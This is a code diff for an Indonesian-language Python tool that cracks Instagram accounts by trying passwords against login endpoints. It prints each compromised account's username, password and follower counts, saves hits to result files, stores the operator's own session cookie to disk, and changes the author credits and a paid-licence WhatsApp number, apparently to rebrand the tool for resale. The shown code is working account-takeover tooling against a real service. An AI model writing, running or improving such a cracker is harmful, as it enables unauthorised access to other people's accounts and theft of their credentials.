@@ -75,9 +75,12 @@ def cekAPI(cookie):
 	return external,user
 
 def checkin():
+	try:
+		kuki=open('.kukis.log','r').read()
 	except FileNotFoundError:
 		login()
 	ex,user=cekAPI(kuki)
+	cookie={'cookie':kuki}
 	instagram(ex,user,cookie).menu()
 
 def login():
@@ -91,6 +94,8 @@ def login():
 
 	x=instagramAPI(us,pw).loginAPI()
 	if x.get('status')=='success':
+		open('.username','a').write(us)
+		open('.kukis.log','a').write(x.get('cookie'))
 		cookie={'cookie':x.get('cookie')}
 		print(f'\n{H}>{C} Login berhasil')
 		os.system('python login.py')
@@ -268,12 +273,12 @@ class instagram:
  __/ /  _  / / /(__  )/ /_ / /_/ /_/_____/ /_/ /  
  /___/  /_/ /_//____/ \__/ \__,_/        \____/{C}
 
-{H}[*] Email       : RAHMATREX99X.MY.ID
+{H}[*] Email       : RAHMAT
 {H}[*] Bergabung   : 26 November 1945
 {H}[*] ---------------------------------------------
 {H}[*] Kadaluwarsa : Sampai Kiamat
 {H}[*] Status      : Premium Sampai Yatim
-{H}[*] Author      : RE99X (RAHMAT AN)
+{H}[*] Author      : RESTU DEVA
 {H}[*] ---------------------------------------------
 
 {H}[01]. crack dari pencarian nama
@@ -292,7 +297,7 @@ class instagram:
 		print(f"""
  [{U}>{C}] Lisensi 1 Bulan / 150k
  [{U}>{C}] Anda bisa melaporkan langsung ke Whatsapp
- [{U}>{C}]  {H}082260731281{C}
+ [{U}>{C}]  {H}081226414983{C}
 		""")
 		exit()
 
@@ -496,13 +501,13 @@ class instagram:
 				x_jason=json.loads(x.text)
 				if "userId" in str(x_jason):
 					nama,pengikut,mengikut,postingan=self.APIinfo(user)
-					print(f"""\r {H}[>]{C} {H}STATUS : {H}RE99X HACK
-  {H}[>]{C} {H}NAMA : {H}{nama}{C}
-  {H}[>]{C} {H}Username : {H}{user}{C}
-  {H}[>]{C} {H}Password : {H}{pw}{C}
-  {H}[>]{C} {H}Pengikut : {H}{pengikut}{C}
-  {H}[>]{C} {H}Mengikuti : {H}{mengikut}{C}
-  {H}[>]{C} {H}Postingan : {H}{postingan}{C}
+					print(f"""\r {H}[>]{C} {H}STATUS : {H}HUSSAIN LIVE
+  {H}[>]{C} {H}NAMA: {H}{nama}{C}
+  {H}[>]{C} {H}Username: {H}{user}{C}
+  {H}[>]{C} {H}Password: {H}{pw}{C}
+  {H}[>]{C} {H}Pengikut: {H}{pengikut}{C}
+  {H}[>]{C} {H}Mengikuti: {H}{mengikut}{C}
+  {H}[>]{C} {H}Postingan: {H}{postingan}{C}
 					""")
 					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
 					success.append(user)
@@ -568,7 +573,7 @@ class instagram:
 			if "userId" in x.text:
 				nama,pengikut,mengikut,postingan=self.APIinfo(user)
 				print(f"""\r   
-  {H}[>]{C} {H}STATUS     : {H}RE99X
+  {H}[>]{C} {H}STATUS     : {H}HUSSAIN LIVE
   {H}[>]{C} {H}NAMA         : {H}{nama}{C}
   {H}[>]{C} {H}Username : {H}{user}{C}
   {H}[>]{C} {H}Password  : {H}{pw}{C}
@@ -662,7 +667,7 @@ class instagram:
 					""");sleep(0.05)
 				else:
 					print(f"""
-  {H}[>]{C}{H} STATUS : RE99X {C}
+  {H}[>]{C}{H} STATUS : HUSSAIN LIVE {C}
   {H}[>]{C}{H} Username : {H}{usr}{C}
   {H}[>]{C}{H} Password : {H}{pwd}{C}
   {H}[>]{C}{H} Pengikut : {H}{fol}{C}
